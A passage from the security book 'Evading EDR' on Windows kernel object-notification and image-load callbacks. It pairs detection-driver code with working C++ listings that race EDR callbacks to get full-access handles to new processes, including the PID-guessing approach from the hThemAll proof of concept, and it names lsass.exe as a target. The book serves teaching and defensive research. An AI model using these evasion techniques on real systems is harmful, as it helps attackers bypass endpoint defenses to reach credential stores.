While this technique would evade certain sensors, an EDR could still 
detect our behavior in plenty of ways. Remember that object callbacks 
might receive notifications about duplication requests. Listing 4-14 shows 
what this detection logic could look like in an EDR’s driver.
OB_PREOP_CALLBACK_STATUS ObjectNotificationCallback(
PVOID RegistrationContext,
POB_PRE_OPERATION_INFORMATION Info)
{
NTSTATUS status = STATUS_SUCCESS;
 1 if (Info->ObjectType == *PsProcessType)
{
if (Info->Operation == OB_OPERATION_HANDLE_DUPLICATE)
{
PUNICODE_STRING psTargetProcessName = HelperGetProcessName(
 (PEPROCESS)Info->Object);
if (!psTargetProcessName))
{
return OB_PREOP_SUCCESS;
}
UNICODE_STRING sLsaProcessName = RTL_CONSTANT_STRING(L"lsass.exe");
2 if (FsRtlAreNamesEqual(psTargetProcessName, &sLsaProcessName, TRUE, NULL))
{
--snip--
}
}
}
--snip--
}
Listing 4-14: Filtering handle-duplication events on the target process name
To detect duplication requests, the EDR could determine whether 
the ObjectType member of the OB_PRE_OPERATION_INFORMATION structure, which 
gets passed to the callback routine, is PsProcessType and, if so, whether its 
Operation member is OB_OPERATION_HANDLE_DUPLICATE 1. Using additional filter-
ing, we could determine whether we’re potentially looking at the technique 
described earlier. We might then compare the name of the target process 
with the name of a sensitive process, or a list of them 2.
A driver that implements this check will detect process-handle duplica-
tion performed with kernel32!DuplicateHandle(). Figure 4-1 shows a mock 
EDR reporting the event.
Evading EDR (Early Access) © 2023 by Matt Hand
74   Chapter 4
Figure 4-1: Detecting process-handle duplication
Unfortunately, at the time of this writing, many sensors perform checks 
only on new handle requests and not on duplicate requests. This may 
change in the future, however, so always evaluate whether the EDR’s driver 
performs this check.
Racing the Callback Routine
In their 2020 paper “Fast and Furious: Outrunning Windows Kernel 
Notification Routines from User-Mode,” Pierre Cicholas, Jose Miguel Such, 
Angelos K. Marnerides, Benjamin Green, Jiajie Zhang, and Utz Roedig 
demonstrated a novel approach to evading detection by object callbacks. 
Their technique involves requesting a handle to a process before execution 
has been passed to the driver’s callback routine. The authors described 
two separate ways of racing callback routines, covered in the sections that 
follow.
Creating a Job Object on the Parent Process
The first technique works in situations when an attacker wants to gain 
access to a process whose parent is known. For example, when a user dou-
ble-clicks an application in the Windows GUI, its parent process should be 
explorer.exe. In those cases, the attacker definitively knows the parent of their 
target process, allowing them to use some Windows magic, which we’ll dis-
cuss shortly, to open a handle to the target child process before the driver 
has time to act. Listing 4-15 shows this technique in action.
int main(int argc, char* argv[])
{
HANDLE hParent = INVALID_HANDLE_VALUE;
HANDLE hIoCompletionPort = INVALID_HANDLE_VALUE;
HANDLE hJob = INVALID_HANDLE_VALUE;
JOBOBJECT_ASSOCIATE_COMPLETION_PORT jobPort;
HANDLE hThread = INVALID_HANDLE_VALUE;
--snip--
hParent = OpenProcess(PROCESS_ALL_ACCESS, true, atoi(argv[1]));
 1 hJob = CreateJobObjectW(nullptr, L"DriverRacer");
hIoCompletionPort = 2 CreateIoCompletionPort(
INVALID_HANDLE_VALUE,
nullptr,
0, 0
);
Evading EDR (Early Access) © 2023 by Matt Hand
Object Notifications   75
jobPort = JOBOBJECT_ASSOCIATE_COMPLETION_PORT{
INVALID_HANDLE_VALUE,
hIoCompletionPort
};
if (!SetInformationJobObject(
hJob,
JobObjectAssociateCompletionPortInformation,
&jobPort,
sizeof(JOBOBJECT_ASSOCIATE_COMPLETION_PORT)
))
{
return GetLastError();
}
if (!AssignProcessToJobObject(hJob, hParent))
{
return GetLastError();
}
hThread = CreateThread(
nullptr, 0,
3 (LPTHREAD_START_ROUTINE)GetChildHandles,
&hIoCompletionPort,
0, nullptr
);
WaitForSingleObject(hThread, INFINITE);
--snip--
}
Listing 4-15: Setting up a job object and I/O completion port to be queried
To gain a handle to a protected process, the operator creates a job 
object on the known parent 1. As a result, the process that placed the 
job object will be notified of any new child processes created through 
an I/O completion port 2. The malware process must then query this 
I/O completion port as quickly as possible. In our example, the internal 
GetChildHandles() function 3, expanded in Listing 4-16, does just that.
void GetChildHandles(HANDLE* hIoCompletionPort)
{
DWORD dwBytes = 0;
ULONG_PTR lpKey = 0;
LPOVERLAPPED lpOverlapped = nullptr;
HANDLE hChild = INVALID_HANDLE_VALUE;
WCHAR pszProcess[MAX_PATH];
do
{
if (dwBytes == 6)
{
hChild = OpenProcess(
Evading EDR (Early Access) © 2023 by Matt Hand
76   Chapter 4
PROCESS_ALL_ACCESS,
true,
1 (DWORD)lpOverlapped
);
2 GetModuleFileNameExW(
hChild,
nullptr,
pszProcess,
MAX_PATH
);
wprintf(L"New child handle:\n"
"PID: %u\n"
"Handle: %p\n"
"Name: %ls\n\n",
DWORD(lpOverlapped),
hChild,
pszProcess
);
}
 3 } while (GetQueuedCompletionStatus(
*hIoCompletionPort,
&dwBytes,
&lpKey,
&lpOverlapped,
INFINITE));
}
Listing 4-16: Opening new process handles
In this function, we first check the I/O completion port in a do-while 
loop 3. If we see that bytes have been transferred as part of a completed 
operation, we open a new handle to the returned PID 1, requesting full 
rights (in other words, PROCESS_ALL_ACCESS). If we receive a handle, we check 
its image name 2. Real malware would do something with this handle, 
such as read its memory or terminate it, but here we just print some infor-
mation about it instead.
This technique works because the notification to the job object occurs 
before the object-callback notification in the kernel. In their paper, the 
researchers measured the time between process-creation and object-
callback notification to be 8.75–14.5 ms. This means that if a handle is 
requested before the notification is passed to the driver, the attacker can 
obtain a fully privileged handle as opposed to one whose access mask has 
been changed by the driver.
Guessing the PID of the Target Process
The second technique described in the paper attempts to predict the PID 
of the target process. By removing all known PIDs and thread IDs (TIDs) 
from the list of potential PIDs, the authors showed that it is possible to 
Evading EDR (Early Access) © 2023 by Matt Hand
Object Notifications   77
more efficiently guess the PID of the target process. To demonstrate this, 
they created a proof-of-concept program called hThemAll.cpp. At the core  
of their tool is the internal function OpenProcessThemAll(), shown in  
Listing 4-17, which the program executes across four concurrent threads to 
open process handles.
void OpenProcessThemAll(
const DWORD dwBasePid,
const DWORD dwNbrPids,
std::list* lhProcesses,
const std::vector* vdwExistingPids)
{
std::list pids;
for (auto i(0); i begin(),
vdwExistingPids->end(),
dwBasePid + i))
{
pids.push_back(dwBasePid + i);
}
while (!bJoinThreads) {
for (auto it = pids.begin(); it != pids.end(); ++it)
{
1 if (const auto hProcess = OpenProcess(
DESIRED_ACCESS,
DESIRED_INHERITANCE,
*it))
{
EnterCriticalSection(&criticalSection);
2 lhProcesses->push_back(hProcess);
LeaveCriticalSection(&criticalSection);
pids.erase(it);
}
}
}
}
Listing 4-17: The OpenProcessThemAll() function used to request handles to processes and 
check their PIDs
This function indiscriminately requests handles 1 to all processes via 
their PIDs in a filtered list. If the handle returned is valid, it is added to an 
array 2. After this function completes, we can check whether any of the 
handles returned match the target process. If the handle does not match 
the target, it is closed.
While the proof of concept is functional, it misses some edge cases, 
such as the reuse of process and thread identifiers by another process or 
thread after one terminates. It is absolutely possible to cover these, but no 
public examples of doing so exist at the time of this writing.
The techniques’ operational use cases may also be limited. For 
instance, if we wanted to use the first technique to open a handle to the 
Evading EDR (Early Access) © 2023 by Matt Hand
agent process, we’d need to run our code before that process starts. This 
would be very challenging to pull off on a real system because most EDRs 
start their agent process via a service that runs early in the boot order. We’d 
need administrative rights to create our own service, and that still doesn’t 
guarantee that we’d be able to get our malware running before the agent 
service starts.
Additionally, both techniques focus on defeating the EDR’s preven-
tive controls and do not take into consideration its detective controls. Even 
if the driver is unable to modify the privileges of the requested handle, 
it might still report suspicious process-access events. Microsoft has stated 
that it won’t fix this issue, as doing so could cause application-compatibility 
problems; instead, third-party developers are responsible for mitigation.
Conclusion
Monitoring handle operations, especially handles being opened to sen-
sitive processes, provides a robust way to detect adversary tradecraft. A 
driver with a registered object-notification callback stands directly inline 
of an adversary whose tactics rely on opening or duplicating handles to 
things such as lsass.exe. When this callback routine is implemented well, the 
opportunities for evading this sensor are limited, and many attackers have 
adapted their tradecraft to limit the need to open new handles to processes 
altogether.
Evading EDR (Early Access) © 2023 by Matt Hand
The last two kinds of notification callback 
routines we’ll cover in this book are image-
load notifications and registry notifications. 
An image-load notification occurs whenever an 
executable, DLL, or driver is loaded into memory on 
the system. A registry notification is triggered when spe-
cific operations in the registry occur, such as key cre-
ation or deletion.
In addition to these notification types, in this chapter we’ll also cover 
how EDRs commonly rely on image-load notifications for a technique 
called KAPC injection, which is used to inject their function-hooking DLLs. 
Lastly, we’ll discuss an evasion method that targets an EDR’s driver directly, 
potentially bypassing all the notification types we’ve discussed.
5
IM AG E- L OA D A N D R EG I S T RY 
NOT IF IC AT ION S
Evading EDR (Early Access) © 2023 by Matt Hand
80   Chapter 5
How Image-Load Notifications Work
By collecting image-load telemetry, we can gain extremely valuable infor-
mation about a process’s dependencies. For example, offensive tools that 
use in-memory .NET assemblies, such as the execute-assembly command in 
Cobalt Strike’s Beacon, routinely load the common language runtime clr.
dll into their processes. By correlating an image load of clr.dll with certain 
attributes in the process’s PE header, we can identify non-.NET processes 
that load clr.dll, potentially indicating malicious behavior.
Registering a Callback Routine
The kernel facilitates these image-load notifications through the nt!PsSetLoad 
ImageNotifyRoutine() API. If a driver wants to receive these events, the devel-
opers simply pass in their callback function as the only parameter to that 
API, as shown in Listing 5-1.
NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING pRegPath)
{
NTSTATUS status = STATUS_SUCCESS;
--snip--
status = PsSetLoadImageNotifyRoutine(ImageLoadNotificationCallback);
--snip--
}
void ImageLoadNotificationCallback(
PUNICODE_STRING FullImageName,
HANDLE ProcessId,
PIMAGE_INFO ImageInfo)
{
--snip--
}
Listing 5-1: Registering an image-load callback routine
Now the system will invoke the internal callback function 
ImageLoadNotificationCallback() each time a new image is loaded into a 
process.
Viewing the Callback Routines Registered on a System
The system also adds a pointer to the function to an array, nt!PspLoad 
ImageNotifyRoutine(). We can traverse this array in the same way as the 
array used for process-notification callbacks discussed in Chapter 3. In 
Listing 5-2, we do this to list the image-load callbacks registered on the 
system.
1: kd> dx ((void**[0x40])&nt!PspLoadImageNotifyRoutine)
.Where(a => a != 0)
.Select(a => @$getsym(@$getCallbackRoutine(a).Function))
Evading EDR (Early Access) © 2023 by Matt Hand
Image-Load and Registry Notifications   81
[0] 
: WdFilter+0x467b0 (fffff803`4ade67b0)
[1] 
: ahcache!CitmpLoadImageCallback (fffff803`4c95eb20)
Listing 5-2: Enumerating image-load callbacks
There are notably fewer callbacks registered here than there were for 
process-creation notifications. Process notifications have more non-security 
uses than image loads, so developers are more interested in implementing 
them. Conversely, image loads are a critical datapoint for EDRs, so we can 
expect to see any EDRs loaded on the system here alongside Defender [0] 
and the Customer Interaction Tracker [1].
Collecting Information from Image Loads
When an image is loaded, the callback routine receives a pointer to an 
IMAGE_INFO structure, defined in Listing 5-3. The EDR can collect telemetry 
from it.
typedef struct _IMAGE_INFO {
 union {
  ULONG Properties;
  struct {
   ULONG ImageAddressingMode : 8;
   ULONG SystemModeImage : 1;
   ULONG ImageMappedToAllPids : 1;
   ULONG ExtendedInfoPresent : 1;
   ULONG MachineTypeMismatch : 1;
   ULONG ImageSignatureLevel : 4;
   ULONG ImageSignatureType : 3;
   ULONG ImagePartialMap : 1;
   ULONG Reserved : 12;
  };
 };
 PVOID ImageBase;
 ULONG ImageSelector;
 SIZE_T ImageSize;
 ULONG ImageSectionNumber;
} IMAGE_INFO, *PIMAGE_INFO;
Listing 5-3: The IMAGE_INFO structure definition
This structure has a few particularly interesting fields. First, 
SystemModeImage is set to 0 if the image is mapped to user address space, such 
as in DLLs and EXEs. If this field is set to 1, the image is a driver being 
loaded into kernel address space. This is useful to an EDR because mali-
cious code that loads into kernel mode is generally more dangerous than 
code that loads into user mode.